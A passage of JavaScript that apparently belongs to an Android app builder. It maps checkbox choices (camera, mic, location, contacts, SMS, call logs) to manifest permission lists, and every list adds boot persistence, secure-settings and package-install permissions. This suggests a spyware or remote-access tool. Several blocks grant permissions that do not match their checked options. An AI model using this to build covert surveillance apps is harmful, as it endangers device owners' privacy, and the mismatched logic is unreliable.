            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
            ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
        //if four are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
